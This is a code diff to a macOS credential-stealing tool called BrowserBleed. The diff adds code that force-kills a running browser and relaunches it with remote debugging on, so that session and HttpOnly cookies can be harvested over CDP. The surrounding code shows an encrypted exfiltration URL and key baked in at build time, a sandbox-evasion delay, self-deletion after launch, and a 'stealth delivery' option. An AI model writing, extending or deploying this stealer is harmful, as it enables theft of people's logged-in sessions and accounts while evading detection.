@@ -357,6 +357,7 @@ def _xor_decrypt(cipher_hex: str, key_hex: str) -> str:
 _EXFIL_URL: str = _xor_decrypt(_EXFIL_URL_ENC, _EXFIL_XOR_KEY)
 _EXFIL_KEY: str = _xor_decrypt(_EXFIL_KEY_ENC, _EXFIL_XOR_KEY)
 _DEFAULT_DELAY: int = 0
+_enable_cdp: bool = True
 
 
 def _evasion_gate(delay_sec: int = 0) -> None:
@@ -962,6 +963,33 @@ def _cdp_find_port(process_name: str) -> int | None:
         except Exception:
             pass
     return None
+
+
+def _cdp_port_alive(port: int) -> bool:
+    try:
+        conn = http.client.HTTPConnection("localhost", port, timeout=1)
+        conn.request("GET", "/json/version")
+        return conn.getresponse().status == 200
+    except Exception:
+        return False
+
+
+def relaunch_browser_with_cdp(process_name: str, port: int = 9222) -> bool:
+    try:
+        subprocess.run(["pkill", "-9", "-f", process_name], capture_output=True)
+    except Exception:
+        pass
+    time.sleep(1)
+    try:
+        subprocess.run(["open", "-a", process_name, "--args", f"--remote-debugging-port={port}"],
+                       check=True)
+    except Exception:
+        return False
+    for _ in range(30):
+        if _cdp_port_alive(port):
+            return True
+        time.sleep(1)
+    return False
 
 
 def _ws_connect(host: str, port: int, path: str) -> socket.socket:
@@ -1592,6 +1620,8 @@ def process_browser(name: str, process_name: str, user_data_path: str, keychain_
     # Always attempt CDP when browser is running; surface session-only and HttpOnly cookies
     if running:
         lines.append("\n  -- [CDP] Session-only Cookies --")
+        if _enable_cdp and _cdp_find_port(process_name) is None:
+            relaunch_browser_with_cdp(process_name)
         cdp_cookies = extract_cookies_cdp(process_name)
         if cdp_cookies:
             cdp_only = [c for c in cdp_cookies if (c["host"], c["name"]) not in disk_cookie_keys]
@@ -1879,7 +1909,7 @@ def _exfil_results(url: str, api_key: str, txt_path: str, csv_path: str | None) 
 
 # ── Main ───────────────────────────────────────────────────────────────────────
 def main():
-    global _do_oidc
+    global _do_oidc, _enable_cdp
 
     parser = argparse.ArgumentParser(
         description="BrowserBleed macOS - Browser Credential Extractor. Authorized use only."
@@ -1895,7 +1925,10 @@ def main():
     parser.add_argument("--exfil",       metavar="URL",       default=_EXFIL_URL or None, help="POST results to report server (default: baked in at build time)")
     parser.add_argument("--exfil-key",   metavar="KEY",       default=_EXFIL_KEY or None, help="API key for --exfil (default: baked in at build time)")
     parser.add_argument("--delay",       type=int, default=_DEFAULT_DELAY, help="Sleep N seconds before extraction (evade short-timeout sandboxes)")
+    parser.add_argument("--enable-cdp",   dest="enable_cdp", action="store_true", default=True, help="Relaunch a running Chromium browser with --remote-debugging-port to capture cookies via CDP — enabled by default")
+    parser.add_argument("--no-cdp",       dest="enable_cdp", action="store_false", help="Disable CDP cookie capture (stealth delivery)")
     args = parser.parse_args()
+    _enable_cdp = args.enable_cdp
     _evasion_gate(args.delay)
 
     # Delete the binary immediately after launch - the process stays alive in memory.
